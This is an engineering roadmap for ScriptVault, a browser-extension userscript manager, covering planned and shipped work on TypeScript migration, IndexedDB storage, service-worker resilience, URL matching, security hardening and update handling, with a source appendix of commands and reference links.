- Add tests for Gist token storage rejection and explicit empty `@grant` denial.
- Update `docs/release-runbook.md` to stop mentioning stale `chrome-webstore-upload-cli` pinning and align with CWS API v2.
- Add a root-artifact guard that flags `ScriptVault-firefox-v2.1.7.xpi`.
- Add editor search history in Monaco adapter.
- Add README feature-claim validation checklist against code entry points.
- Make high-level npm audit either fail CI or document why it is advisory-only.
- Add changelog entries for the latest two hardening commits.
- Add `web-ext lint` to a Firefox build job once a Firefox build directory is produced.

### Larger Bets

- Collapse runtime JS and TypeScript mirror to one authoritative source.
- Build a full release trust pipeline with signatures, SBOM, source ZIP, package diff, rollback rehearsal, and CWS/AMO status checks.
- Replace the legacy XHR bridge with dedicated user-script messaging while keeping tested fallback behavior.
- Add per-script trust receipts with provenance, dependency hashes, permission changes, and rollback.
- Add sync cockpit and user-owned S3-compatible sync provider.
- Add measured large-library virtualization and local health diagnostics.

### Explicit Non-Goals

- Full native mobile app rewrite - rejected because the current product is a browser-extension userscript manager.
- Account-backed multi-user collaboration - rejected because it conflicts with local-first trust and adds backend custody risk.
- External usage analytics - rejected; local diagnostics are acceptable, outbound telemetry is not.
- One-click registry publishing from the extension - rejected for now because it expands account/token risk and moderation scope.
- Paid tiers or monetized script marketplace - rejected because it dilutes product identity and adds business/process burden.
- Remote configuration kill-switch - rejected because it introduces remote control over a code-execution tool.
- Beginner no-code marketplace positioning - rejected because ScriptVault's strongest fit is power-user trust, compatibility, and local control.

### Open Questions

- Do Chrome Web Store credentials and AMO credentials exist in the operator environment, or should release automation stop at signed local artifacts plus manual upload instructions?
- Should the long-term source of truth be TypeScript-first runtime emission, or should the current JS runtime remain canonical with TS used only for contracts until a staged migration lands?
- What is the intended support promise for Firefox: experimental self-loaded XPI, AMO unlisted, or AMO listed?

### Phase 5 Self-Audit

- Traceability: each Now/Next roadmap item includes local or external source IDs; source URLs are listed in the appendix.
- Tier justification: every harvested row has a one-sentence placement reason.
- Category coverage: security, accessibility, i18n/l10n, observability, testing, docs, distribution/packaging, plugin/extension ecosystem, mobile, offline/resilience, multi-user/collab, migration paths, and upgrade strategy are covered or explicitly rejected.
- Duplicate check: feature rows remain raw enough for traceability; roadmap items merge only where implementation naturally belongs together.
- Adversarial check: the plan prioritizes trust and release correctness before novelty because ScriptVault executes arbitrary user code and currently has artifact/source drift.

### Round 14 Source Appendix

Local sources:

- L01 `git status --branch --short` - clean `main...origin/main` before roadmap edit.
- L02 `rtk git log -10 --oneline --decorate` - recent commits through `f4c748c`.
- L03 `git log -200 --oneline --decorate` - history reviewed back to first public packaging work.
- L04 `manifest.json` - Chrome MV3, v3.11.0, min Chrome 130, permissions, host permissions, surfaces.
- L05 `README.md` - current user-facing claims, feature list, install docs, stale claims.
- L06 `package.json` - scripts and dependency fingerprints.
- L07 `manifest-firefox.json` and `FIREFOX-PORT.md` - Firefox MV3 target and unchecked port tasks.
- L08 `CHANGELOG.md` - unreleased notes, test counts, hardening history.
- L09 `.github/workflows/ci.yml` - Node 20 CI, audit advisory behavior, tests/build/smoke/artifacts.
- L10 `esbuild.config.mjs` - ordered JS concatenation build and TypeScript check separation.
- L11 `docs/cross-browser-pipeline.md` - WXT/cross-browser packaging plan.
- L12 `docs/release-runbook.md` - release automation, CWS API, provenance gaps.
- L13 `docs/research/iter-1-l1-claude-led.md` and `docs/research/iter-1-l3-claude-smoke.md` - prior prioritized hardening candidates.
- L14 `docs/require-provenance-design.md` - provenance/SRI/Sigstore design.
- L15 `docs/wcag3-gap-analysis.md` - APCA, help consistency, live-region, language gaps.
- L16 `docs/extension-interop.md` and `docs/mcp-2026-compliance.md` - external interop gates and non-default stance.
- L17 `gh release list --limit 20` - latest GitHub Release is `v2.3.4`.
- L18 Recent commits `053c1a5`, `428b718`, `f4c748c` - hardening and research-plan drift context.
- L19 `src/background/install-handler.ts`, `src/background/update-checker.ts`, `background.core.js` - bounded-fetch drift evidence.
- L20 `npm audit --audit-level=high --omit=optional` and `npm outdated --json` - security and dependency state.
- L21 `tests/gui-secondary-audit.test.js`, `tests/wrapper-gm-tabs-39-13.test.js`, `tests/fetch-bounded.test.js` - current coverage boundaries.
- L22 `.factory/state.yaml`, `.factory/large-repo-state.yaml` - remaining `XHR-PRIVACY` and `DNS-REBIND` tasks.

External sources:

- S01 Chrome `userScripts` API - https://developer.chrome.com/docs/extensions/reference/api/userScripts
- S02 MDN `userScripts` API - https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/userScripts
- S03 Chrome Web Store API v2 reference - https://developer.chrome.com/docs/webstore/api/reference/rest
- S04 Chrome Extensions "What's new" - https://developer.chrome.com/docs/extensions/whats-new
- S05 Chrome Web Store rollback docs - https://developer.chrome.com/docs/webstore/rollback
- S06 Chrome Web Store update docs - https://developer.chrome.com/docs/webstore/update/
- S07 Chrome Web Store program policies - https://developer.chrome.com/docs/webstore/program-policies/
- S08 Chrome extension update testing tool announcement - https://developer.chrome.com/docs/extensions/whats-new
- S09 MDN `browser_specific_settings` / AMO data collection - https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/browser_specific_settings
- S10 MDN Chrome incompatibilities - https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Chrome_incompatibilities
- S11 MDN `declarativeNetRequest` - https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/declarativeNetRequest
- S12 Chrome DNR API - https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest
- S13 Chrome sidePanel API - https://developer.chrome.com/docs/extensions/reference/api/sidePanel
- S14 Chrome offscreen API - https://developer.chrome.com/docs/extensions/reference/api/offscreen
- S15 Awesome Userscripts - https://github.com/awesome-scripts/awesome-userscripts
- S16 Violentmonkey repo - https://github.com/violentmonkey/violentmonkey
- S17 Violentmonkey issue 2528 ESM loader - https://github.com/violentmonkey/violentmonkey/issues/2528
- S18 Violentmonkey PR 2521 S3-compatible sync - https://github.com/violentmonkey/violentmonkey/pull/2521
- S19 Violentmonkey issue 2419 local require - https://github.com/violentmonkey/violentmonkey/issues/2419
- S20 Violentmonkey issue 2410 only-for-site option - https://github.com/violentmonkey/violentmonkey/issues/2410
- S21 Violentmonkey issue 2403 add domain easily - https://github.com/violentmonkey/violentmonkey/issues/2403
- S22 Violentmonkey issue 2365 policy deployment - https://github.com/violentmonkey/violentmonkey/issues/2365
- S23 Violentmonkey release v2.37.0 - https://github.com/violentmonkey/violentmonkey/releases/tag/v2.37.0
- S24 Tampermonkey home/features - https://old.tampermonkey.net/
- S25 Tampermonkey repo - https://github.com/Tampermonkey/tampermonkey
- S26 Tampermonkey issue 2702 invert/not filters - https://github.com/Tampermonkey/tampermonkey/issues/2702
- S27 Tampermonkey issue 2579 profiles - https://github.com/Tampermonkey/tampermonkey/issues/2579
- S28 Tampermonkey issue 2675 install if site unavailable - https://github.com/Tampermonkey/tampermonkey/issues/2675
- S29 Tampermonkey issue 2595 Firefox permission friction - https://github.com/Tampermonkey/tampermonkey/issues/2595
- S30 Tampermonkey issue 2624 reinstall tags - https://github.com/Tampermonkey/tampermonkey/issues/2624
- S31 Tampermonkey issue 2616 data collection permissions - https://github.com/Tampermonkey/tampermonkey/issues/2616
- S32 Greasemonkey repo - https://github.com/greasemonkey/greasemonkey
- S33 Greasemonkey PR 3220 First Party Isolation XHR - https://github.com/greasemonkey/greasemonkey/pull/3220
- S34 quoid/userscripts repo - https://github.com/quoid/userscripts
- S35 quoid/userscripts issue 431 examples - https://github.com/quoid/userscripts/issues/431
- S36 quoid/userscripts issue 521 GitHub private repo sync - https://github.com/quoid/userscripts/issues/521
- S37 quoid/userscripts issue 467 GM.fetch - https://github.com/quoid/userscripts/issues/467
- S38 quoid/userscripts issue 584 SRI - https://github.com/quoid/userscripts/issues/584
- S39 quoid/userscripts issue 520 third-party sync storage - https://github.com/quoid/userscripts/issues/520
- S40 quoid/userscripts PR 900 memory usage - https://github.com/quoid/userscripts/pull/900
- S41 ScriptCat repo - https://github.com/scriptscat/scriptcat
- S42 ScriptCat issue 1034 background/timed APIs - https://github.com/scriptscat/scriptcat/issues/1034
- S43 ScriptCat issue 797 one-click subscribe generation - https://github.com/scriptscat/scriptcat/issues/797
- S44 ScriptCat issue 684 manual sync/import-export config - https://github.com/scriptscat/scriptcat/issues/684
- S45 ScriptCat issue 668 recycle bin - https://github.com/scriptscat/scriptcat/issues/668
- S46 ScriptCat issue 633 mobile text editing - https://github.com/scriptscat/scriptcat/issues/633
- S47 ScriptCat PR 1463 sandbox prototype inheritance fix - https://github.com/scriptscat/scriptcat/pull/1463
- S48 Stay repo - https://github.com/shenruisi/Stay
- S49 Android WebMonkey repo - https://github.com/warren-bank/Android-WebMonkey
- S50 OpenUserJS repo - https://github.com/OpenUserJS/OpenUserJS.org
- S51 GreasyFork repo - https://github.com/greasyfork-org/greasyfork
- S52 Gist userscript manager repo - https://github.com/ste-xx/gist-userscript-manager
- S53 ScriptFlow repo - https://github.com/kusoidev/ScriptFlow
- S54 Shieldmonkey repo - https://github.com/Shieldmonkey/Shieldmonkey
- S55 ScriptRunner repo - https://github.com/anilkumarum/ScriptRunner
- S56 BareScript - https://www.barescript.org/
- S57 Stylus repo - https://github.com/openstyles/stylus
- S58 Stylus issue 2086 editor search history - https://github.com/openstyles/stylus/issues/2086
- S59 Stylus issue 2070 Firefox CSP style resources - https://github.com/openstyles/stylus/issues/2070
- S60 Stylus issue 2065 OKHSL/OKLAB variables - https://github.com/openstyles/stylus/issues/2065
- S61 Stylus issue 2053 containers - https://github.com/openstyles/stylus/issues/2053
- S62 WXT target browsers - https://wxt.dev/guide/essentials/target-different-browsers.html
- S63 WXT manifest config - https://wxt.dev/guide/essentials/config/manifest.html
- S64 WXT publishing - https://wxt.dev/guide/essentials/publishing
- S65 Plasmo repo - https://github.com/PlasmoHQ/plasmo
- S66 Microsoft Edge extension publishing - https://learn.microsoft.com/en-us/microsoft-edge/extensions/publish/publish-extension
- S67 Mozilla web-ext release 10.2.0 - https://github.com/mozilla/web-ext/releases/tag/10.2.0
- S68 Mozilla webextension-polyfill - https://github.com/mozilla/webextension-polyfill
- S69 Sigstore docs - https://docs.sigstore.dev/
- S70 npm provenance docs - https://docs.npmjs.com/generating-provenance-statements/
- S71 SLSA spec v1.1 - https://slsa.dev/spec/v1.1/
- S72 Cosign repo - https://github.com/sigstore/cosign
- S73 Singapore CSA alert on compromised Chrome extensions - https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2024-147/
- S74 What is in the Chrome Web Store? - https://arxiv.org/abs/2406.12710
- S75 Did I Vet You Before? - https://arxiv.org/abs/2406.00374
- S76 Secure Annex Cyberhaven extension compromise - https://secureannex.com/blog/cyberhaven-extension-compromise/
- S77 Monaco Editor releases - https://github.com/microsoft/monaco-editor/releases
- S78 esbuild releases - https://github.com/evanw/esbuild/releases
- S79 Vitest releases - https://github.com/vitest-dev/vitest/releases
- S80 TypeScript releases - https://github.com/microsoft/TypeScript/releases
- S81 jsdom releases - https://github.com/jsdom/jsdom/releases
- S82 Puppeteer releases - https://github.com/puppeteer/puppeteer/releases
- S83 chrome-webstore-upload-cli releases - https://github.com/fregante/chrome-webstore-upload-cli/releases
- S84 WXT releases - https://github.com/wxt-dev/wxt/releases
- S85 WCAG 2.2 - https://www.w3.org/TR/WCAG22/
- S86 W3C WCAG 3 draft - https://www.w3.org/TR/wcag-3.0/
- S87 APCA / WCAG contrast method - https://www.w3.org/WAI/GL/task-forces/silver/wiki/Visual_Contrast_of_Text_Subgroup
- S88 Reddit Chrome extension update/rollback community signal - https://www.reddit.com/r/chrome_extensions/

## Phase 0 — Foundation (Prerequisite for Everything)

**Goal:** Get the development environment working so changes can be validated.

### 0.1 Install Node.js & Bootstrap
- Install Node.js LTS (20.x+)
- Run `npm install` to pull esbuild, vitest, monaco-editor
- Run `npm test` — fix any failures in the 7 existing test suites (204 cases)
- Run `node esbuild.config.mjs` — verify it produces identical `background.js` to `bash build-background.sh`

### 0.2 Bundle Monaco Locally
- Run `node esbuild.config.mjs --monaco-only` to copy Monaco from node_modules to `lib/monaco/`
- Update `editor-sandbox.html` to load from `lib/monaco/` instead of `cdn.jsdelivr.net`
- Remove the jsdelivr CSP entry from `manifest.json` sandbox policy
- Verify editor loads and all 8 themes work

### 0.3 CI Pipeline
- [x] Add GitHub Actions workflow: `npm test` on push/PR
- [x] Add build step: verify `node esbuild.config.mjs` succeeds
- [x] Add artifact: upload built extension ZIP

**2026-04-26 note:** Added `.github/workflows/ci.yml` to run `npm ci`, `npm run typecheck`, `npm test`, `npm run build`, package with `bash build.sh`, and upload the Chrome ZIP artifact on push/PR.

### 0.4 Smoke Test Harness
- [x] Install Puppeteer Core
- [x] Write a minimal E2E test: load extension → open dashboard → verify scripts tab renders
- [x] Wire into CI

**2026-04-26 note:** Added `npm run smoke:dashboard`, which loads the unpacked extension in Chrome, opens the dashboard, and verifies the installed-scripts surface. CI now provisions Chrome and runs the smoke check after the build.

**Exit criteria:** `npm test` passes, Monaco loads locally, CI is green, one E2E test exists.

---

## Phase 1 — TypeScript Migration

**Goal:** Replace global-scope IIFEs and bash concatenation with a typed module system.

### 1.1 TypeScript Setup
- Add `typescript` to devDependencies
- Create `tsconfig.json` with:
  - `strict: true`, `noUncheckedIndexedAccess: true`
  - `module: "esnext"`, `target: "es2022"`
  - `rootDir: "src/"`, `outDir: "dist/"`
  - Path aliases: `@modules/*`, `@shared/*`, `@bg/*`, `@pages/*`
- Update esbuild config to handle `.ts` files

### 1.2 Shared Types
Create `src/types/` with:
- `script.ts` — `Script`, `ScriptMetadata`, `ScriptSettings`, `ScriptStats`, `VersionHistoryEntry`
- `messages.ts` — Discriminated union of all message types (`{ action: 'getScripts' } | { action: 'toggleScript', scriptId: string, enabled: boolean } | ...`)
- `storage.ts` — `StorageSchema`, `SettingsSchema`
- `chrome.ts` — Augmented Chrome API types for `chrome.userScripts`
- `gm-api.ts` — GM API function signatures

### 1.3 Incremental Module Migration
Migrate one module at a time, keeping the build working after each:

**Wave 1 — Leaf modules (no internal dependencies):**
1. `shared/utils.js` → `src/shared/utils.ts`
2. `modules/i18n.js` → `src/modules/i18n.ts`
3. `modules/error-log.js` → `src/modules/error-log.ts`
4. `modules/quota-manager.js` → `src/modules/quota-manager.ts`
5. `modules/npm-resolve.js` → `src/modules/npm-resolve.ts`

**Wave 2 — Core modules:**
6. `modules/storage.js` → `src/modules/storage.ts` (biggest win — types catch the `onInstall`/`onInstalled` class of bugs)
7. `modules/xhr.js` → `src/modules/xhr.ts`
8. `modules/resources.js` → `src/modules/resources.ts`
9. `modules/notifications.js` → `src/modules/notifications.ts`
10. `modules/migration.js` → `src/modules/migration.ts`

**Wave 3 — Complex modules:**
11. `modules/sync-providers.js` → `src/modules/sync-providers.ts`
12. `modules/sync-easycloud.js` → `src/modules/sync-easycloud.ts`
13. `modules/backup-scheduler.js` → `src/modules/backup-scheduler.ts`
14. `modules/userstyles.js` → `src/modules/userstyles.ts`
15. `modules/public-api.js` → `src/modules/public-api.ts`

**Wave 4 — Background service worker:**
16. `bg/analyzer.js` → `src/bg/analyzer.ts`
17. `bg/netlog.js` → `src/bg/netlog.ts`
18. `bg/signing.js` → `src/bg/signing.ts`
19. `bg/workspaces.js` → `src/bg/workspaces.ts`
20. `background.core.js` → `src/background/index.ts` (split into sub-modules, see 1.4)

**Wave 5 — Extension pages:**
21. `pages/popup.js` → `src/pages/popup.ts`
22. `pages/sidepanel.js` → `src/pages/sidepanel.ts`
23. `pages/install.js` → `src/pages/install.ts`
24. `pages/dashboard.js` → `src/pages/dashboard/index.ts` (split into sub-modules)
25. All 27 `dashboard-*.js` → `src/pages/dashboard/modules/*.ts`

### 1.4 Break Up background.core.js (~6,100 lines)
Split into focused modules under `src/background/`:
- `index.ts` — Entry point, event listener registration
- `parser.ts` — Userscript metadata parser
- `registration.ts` — `chrome.userScripts` registration/unregistration
- `url-matcher.ts` — `@match`/`@include`/`@exclude` matching (shared with sidepanel/popup)
- `update-checker.ts` — Auto-update polling and application
- `gm-api-handler.ts` — GM_* API message handlers
- `context-menu.ts` — Context menu setup and handlers
- `badge.ts` — Badge count management
- `wrapper-builder.ts` — `buildWrappedScript()` code generation
- `tab-reload.ts` — `autoReloadMatchingTabs()` debounce logic
- `dnr-rules.ts` — DeclarativeNetRequest rule management
- `install-handler.ts` — Script install/uninstall logic

### 1.5 Update Build System
- esbuild config produces multiple bundles:
  - `background.js` — service worker (tree-shaken, single file)
  - `popup.js` — popup bundle
  - `dashboard.js` — dashboard bundle (code-split by tab/module)
  - `sidepanel.js` — sidepanel bundle
  - `install.js` — install page bundle
  - `content.js` — content script (minimal, no bundling needed)
- Remove `build-background.sh` (replaced by esbuild)
- Source maps in dev mode, minified in prod

### 1.6 Typed Message Passing
Replace stringly-typed `chrome.runtime.sendMessage({ action: '...' })` with:
```typescript
// src/types/messages.ts
type BackgroundMessage =
  | { action: 'getScripts' }
  | { action: 'toggleScript'; scriptId: string; enabled: boolean }
  | { action: 'saveScript'; scriptId: string; code: string }
  // ... all ~50 message types

// src/shared/messaging.ts
function sendToBackground<T extends BackgroundMessage>(msg: T): Promise<ResponseFor<T>>
```
This catches message shape mismatches at compile time (the exact bug class that caused `onInstall`/`onInstalled`, `type`/`action`, and `scripts`/`userscripts` issues).

**Exit criteria:** All source is TypeScript, `tsc --noEmit` passes with strict mode, esbuild produces working bundles, all existing tests pass.

---

## Phase 2 — Storage Layer Rewrite ✅ Shipped in v3.0.0

**Goal:** Replace the single-blob `chrome.storage.local` approach with a scalable, crash-safe storage layer.

### 2.1 IndexedDB for Script Code
- Create `src/storage/script-db.ts` using IndexedDB:
  - Object store: `scripts` — keyed by scriptId, stores `{ id, code, resources, versionHistory }`
  - Object store: `values` — keyed by `${scriptId}:${key}`, stores GM_getValue data
  - Object store: `backups` — keyed by backupId, stores ZIP blobs (not base64 in chrome.storage)
- Keep `chrome.storage.local` for:
  - `settings` — small, needs sync-friendly access
  - `scriptIndex` — lightweight metadata array (id, name, enabled, version, matchPatterns) for fast badge/popup lookups without opening IndexedDB
- Migration: on first load, move script code from `userscripts` blob to IndexedDB per-script entries

### 2.2 Transactional Write Operations
```typescript
// src/storage/transaction.ts
async function withTransaction<T>(
  stores: string[],
  mode: 'readwrite',
  fn: (tx: IDBTransaction) => Promise<T>
): Promise<T>
```
- All multi-step operations (toggle, save, update, delete) wrapped in a transaction
- No more "cache rollback on failure" pattern — either the whole transaction commits or nothing does
- Concurrent writes to different scripts don't block each other (separate object store entries)

### 2.3 Per-Script Storage Keys
- Each script is its own IndexedDB entry — no more serializing/deserializing every script on every read/write
- `getAll()` returns the lightweight index from `chrome.storage.local`, not full script objects
- `get(id)` reads a single IndexedDB entry
- `set(id, script)` writes a single IndexedDB entry + updates the index

### 2.4 Stats Write Coalescing
- Replace the current "mutate cache reference + debounced save()" pattern
- New approach: `ScriptStats` is a separate IndexedDB object store
- Stats writes are fire-and-forget IndexedDB puts (no impact on script save operations)
- Eliminates the "stats lost if script saved within 5s" bug by design

### 2.5 Backup Storage Migration
- Move backup ZIP blobs from `chrome.storage.local` (base64 strings) to IndexedDB (raw ArrayBuffer)
- `getBackupList()` returns metadata only (no blob deserialization)
- `getBackupData(id)` streams the blob on demand
- Selective restore reads individual scripts from the ZIP, not the whole blob

**Exit criteria:** All data in IndexedDB (except settings/index), transactions protect multi-step operations, backup blobs are raw ArrayBuffer, existing tests updated and passing.

**Status:** Shipped in v3.0.0. `src/storage/{idb,transaction,script-db,migration-v3}.ts` ship the IDB layer; `ScriptStorage`, `ScriptValues`, and `PublicAPI.installScript`/`toggleScript` route through DAOs. Migration is automatic on first v3 boot (legacy keys preserved 30 days as a safety net). 550 tests passing including IDB-aware rollback regression suite. Stats fire-and-forget integration deferred to a follow-up (StatsDAO exists, ScriptStats module not yet wired). BackupStorage refactor also deferred — backups still go through `chrome.storage.local` until the backup-scheduler module is migrated.

---

## Phase 3 — Service Worker Resilience ✅ Shipped in v3.0.1 + v3.0.2

**Goal:** Every in-memory timer and Map survives service worker termination.

### 3.1 Replace All setTimeout with chrome.alarms
Audit and replace:
- `_debouncedStatsSave` (5s debounce) → `chrome.alarms.create('statsSave', { delayInMinutes: 0.1 })`
- `autoReloadMatchingTabs` (500ms debounce) → Keep as setTimeout (sub-second, acceptable to lose)
- `_debouncedSync` in sync-easycloud.js → `chrome.alarms.create('syncDebounce', { delayInMinutes: 0.5 })`
- Notification context cleanup (5min) → `chrome.alarms.create('notifCleanup_${id}', { delayInMinutes: 5 })`
- All other `setTimeout` calls > 1 second → `chrome.alarms`

### 3.2 Persist Runtime State to chrome.storage.session
- `self._toggleLocks` → Not needed with transactional storage (Phase 2 eliminates the race)
- `_openTabTrackers` → `chrome.storage.session.set({ openTabTrackers: [...] })`
- `_notifCallbacks` → Store callback metadata in `chrome.storage.session`; re-hydrate on wake
- `_registeredTabs` (userstyles) → Query active tabs on wake instead of tracking in memory

### 3.3 Cold-Start Handler Pattern
```typescript
// src/background/lifecycle.ts
let _initialized = false;
const _initPromise: Promise<void> | null = null;

async function ensureInitialized(): Promise<void> {
  if (_initialized) return;
  if (_initPromise) return _initPromise;
  _initPromise = doInit();
  await _initPromise;
  _initialized = true;
}

// Every message handler wraps with:
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  ensureInitialized().then(() => handleMessage(msg, sender, sendResponse));
  return true; // async response
});
```

### 3.4 Declarative Script Registration
- Call `chrome.userScripts.register()` once per script, let Chrome persist registrations
- On service worker wake, diff current registrations against storage and only update changes
- Use `chrome.userScripts.getScripts()` to check what's already registered before re-registering

**Exit criteria:** Extension survives Chrome killing and restarting the service worker mid-operation, no data loss, no orphaned state.

**Status:** Shipped across v3.0.1 (cold-start guard, statsSave alarm) and v3.0.2 (SessionState persistence for `_notifCallbacks` / `_openTabTrackers` / `_audioWatchedTabs`, stale-script unregistration in `registerAllScripts` diff-on-wake). Code-hash–based change detection deferred — current diff catches add/remove but treats updated-in-place scripts as a forceReregister upstream concern.

---

## Phase 4 — URL Matching Engine Rewrite

**Goal:** One correct, shared, fast URL matcher used everywhere.

**Status:** Partially shipped in v3.1.0 — `MatchSet` (4.2) lands in both `background.core.js` and the TS mirror at `src/background/url-matcher.ts`; `getScriptsForUrl` now uses it; the matcher tests now import the production TS module instead of duplicating logic. Remaining: 4.3 (popup/sidepanel currently message the background for matching, so they share results indirectly — formal direct-import bundle still pending an esbuild migration), 4.1's full path-vs-query separation rewrite, plus the 4.5 fuzz/benchmark suite.

### 4.1 Unified Matcher Module
Create `src/shared/url-matcher.ts`:
- Full Tampermonkey-compatible `@match` (Chrome match pattern spec)
- Full `@include` (glob with `*` and `?`, plus regex patterns)
- `@exclude` and `@exclude-match` support
- `<all_urls>` special pattern
- Proper handling: path matching uses pathname only (not query string), aligning with Chrome's native behavior

### 4.2 Precompiled Match Sets ✅ Shipped in v3.1.0
```typescript
class MatchSet {
  private universal: Script[];          // <all_urls>, *, regex includes, host-less globs
  private byHost: Map<string, Script[]>; // host hint → scripts indexed under that host

  constructor(scripts: readonly Script[]);
  getCandidates(url: string): Script[]; // strict superset of true matches
  getMatching(url: string): Script[];   // candidates filtered through doesScriptMatchUrl
}
```
- Builds an `O(1)` hostname → script bucket so `getScriptsForUrl` no longer linear-scans every pattern.
- Wildcard subdomains (`*.example.com`) indexed under the base domain; deep subdomains (`a.b.example.com`) resolved via parent-suffix walk.
- Regex `@include` and host-less globs land in a universal bucket so the candidate set remains a strict superset of the true match set (zero false negatives).
- Cached in `_matchSetCache`; invalidated automatically by `invalidateMatchSet()` global hook called from `ScriptStorage.set/delete/clear`.
- Wired into the `getScriptsForUrl` background message handler. Other hot paths (`registerAllScripts` matching loops, tab-reload, badge updates) can adopt `getMatchSet().getMatching(url)` incrementally.

### 4.3 Share Across All Contexts
- Background uses `MatchSet` for registration, badge counts, tab reload
- Popup imports `url-matcher.ts` (bundled into popup.js)
- Sidepanel imports `url-matcher.ts` (bundled into sidepanel.js)
- All three produce identical results (eliminates the current divergence bugs)

### 4.4 @include Glob-to-Match Conversion
- Improve `convertIncludeToMatch` to handle query strings correctly
- For patterns that can't be expressed as match patterns, use broad match + runtime filter
- `isRegexPattern` requires metacharacters (already fixed, formalize in the new module)

### 4.5 Comprehensive Matcher Tests
- Port Tampermonkey's known test cases
- Edge cases: query strings, fragments, IDN domains, IPv6, data: URLs, about:blank
- Fuzz testing with random URLs against random patterns
- Benchmark: measure lookup time with 500+ scripts

**2026-05-02 note (v3.1.0):** The url-matcher test file now imports `src/background/url-matcher.ts` directly instead of redefining the matcher logic locally — the previous duplication had silently drifted. 21 new tests added covering `MatchSet` (host indexing, wildcard subdomains, universal bucket, port stripping, dedup), `isUrlBlockedByGlobalSettings` (denied-host suffix-coincidence guard, whitelist/blacklist modes, malformed URLs), and a ReDoS regression that pins the `*+ → *` collapse in `matchIncludePattern`. Full suite is now 571 tests across 33 files. Fuzz harness + 500-script benchmark still pending.

**Exit criteria:** Single `url-matcher.ts` used in background, popup, and sidepanel. All three agree on every URL. Trie-based lookup. 100+ matcher test cases.

---

## Phase 5 — Security Hardening

**Goal:** Defense-in-depth for script injection, install flow, and external APIs.

### 5.1 Per-Script World Isolation
- Each script gets a unique `worldId` in `chrome.userScripts.register()`
- Scripts with `@grant none` get a world with no GM API bridge
- `@connect` enforcement: the service worker validates `GM_xmlhttpRequest` target URLs against the script's `@connect` whitelist (currently advisory)

### 5.2 @require Security
- Fetch `@require` dependencies at install/update time, not at injection time
- Store fetched code in IndexedDB with a SHA-256 hash
- On injection, verify hash matches before including in the wrapper
- SRI (`@require url#sha256=...`) enforced when present
- Log a warning if a `@require` URL changes content between fetches

### 5.3 Install Flow Hardening
- Replace regex-based static analysis with real AST parsing (Acorn, already available in offscreen document)
- Permissions dialog: show what GM APIs the script requests with risk explanations
- On update: diff against previous version, highlight new permissions, new `@connect` domains, new `@require` URLs
- Code signing verification: if `@signature` is present and a trusted key is configured, verify before install

### 5.4 Public API Lockdown
- Deny all web origins by default (already fixed, formalize)
- Capability tokens: `requestAccess({ origin, permissions: ['list', 'install'] })` → user approves → token issued
- Per-origin rate limiting (not just global)
- Remove the SSRF vector: `scriptvault:install` must not fetch until user approves
- Audit all `postMessage` handlers for origin validation

### 5.5 Webhook & Sync Security
- Webhook URLs: validate `https://` only, no internal IPs (RFC 1918 check)
- Gist encryption: remove the fake PBKDF2 (hardcoded key), rely on `chrome.storage.local` sandbox
- Cloud sync: encrypt with a user-provided passphrase (or remove encryption claim entirely)
- npm resolver: only use resolved exact semver versions in CDN URLs (no ranges, no path traversal chars)

**Status:**
- **Webhook RFC 1918 / internal-host guard shipped in v3.6.1 (2026-05-02).** `PublicAPI.setWebhook` rejects URLs whose hostname matches the existing `_isInternalHost` classifier (localhost aliases, IPv4 loopback/unspecified/RFC 1918/CGNAT/link-local/broadcast, IPv6 loopback/link-local/ULA). 7 new tests cover the rejection set; public hostnames + public IPv4 still pass.
- npm resolver SSRF guard (path traversal + exact semver) was already in place from earlier rounds.
- **Gist fake-encryption removed in v3.6.2 (2026-05-02).** Token now stored plaintext in `chrome.storage.local`; one-shot legacy migration decrypts existing installs' tokens with the old hardcoded key and re-saves them under the new key, then drops the legacy entry. UX hint copy updated to describe the storage model honestly.
- Cloud-sync passphrase encryption still pending.

### 5.6 CSP Tightening
- Remove `https://cdn.jsdelivr.net` from sandbox CSP after Monaco is bundled locally (Phase 0.2)
- Extension pages CSP: keep `script-src 'self'` (already correct)
- Audit all `innerHTML` assignments in dashboard modules for XSS
  - `dashboard-gamification.js` — escape `a.icon`
  - `dashboard-whatsnew.js` — escape changelog content
  - Any future dynamic data source must use `textContent` or explicit escaping

**Exit criteria:** Per-script worlds, @require hashed and verified, AST-based install analysis, public API deny-by-default with capability tokens, no innerHTML XSS vectors, no SSRF.

---

## Phase 6 — Update System Overhaul

**Goal:** Reliable, efficient, user-friendly script updates.

### 6.1 Differential Updates ✅ Shipped
- Send `If-Modified-Since` / `If-None-Match` headers on update checks
- Skip download if 304 Not Modified
- Track ETags per script in metadata
- Exponential backoff on failed update checks (not fixed interval)

**Status:** Conditional fetch (`If-None-Match`/`If-Modified-Since` + 304 short-circuit) was already in place. **v3.6.0 (2026-05-02)** added the per-script exponential backoff layer: `_updateFailureCount` doubles on each failure (1m base, capped at 24h); `_updateNextCheck` lets the auto-update path skip cooldowns; manual checks (popup "Check for Update") bypass the cooldown. 304 now also clears backoff state to recover from stale cooldowns. 4 unit tests pin the `_nextRetryAt` math.

### 6.2 Staged Updates
- Download update → store as pending in IndexedDB (don't apply)
- Show "Update available" badge in dashboard/popup
- User reviews diff (using the improved diff viewer from Phase 7)
- One-click apply or dismiss
- Option for auto-apply (trusted authors / scripts with no new permissions)

### 6.3 Unlimited Version History
- Move `versionHistory` from the script metadata object to a separate IndexedDB object store
- No arbitrary cap (currently 5) — keep all versions, with optional auto-prune by age
- Each history entry: `{ version, code, timestamp, source: 'update' | 'manual' | 'rollback' }`
- Rollback to any version, not just the previous one

### 6.4 Update Queue
- Background queue with priority (manual check > auto-check)
- Concurrency limit (max 3 simultaneous update checks)
- Retry with backoff on network failure
- Progress reporting to dashboard/popup

**Exit criteria:** Conditional HTTP requests, staged update review, unlimited version history, queued updates with retry.

---

## Phase 7 — Dashboard UX Overhaul

**Goal:** Professional, performant dashboard UI.

### 7.1 Virtual Scrolling for Script List
- Replace "render all rows to DOM" with a virtual list
- Only render visible rows + buffer (typically 20-30 rows visible)
- Smooth scrolling with correct scroll bar sizing
- Handles 1000+ scripts without janking

### 7.2 Proper Diff Viewer
- Replace naive line-by-line positional comparison with Myers diff algorithm
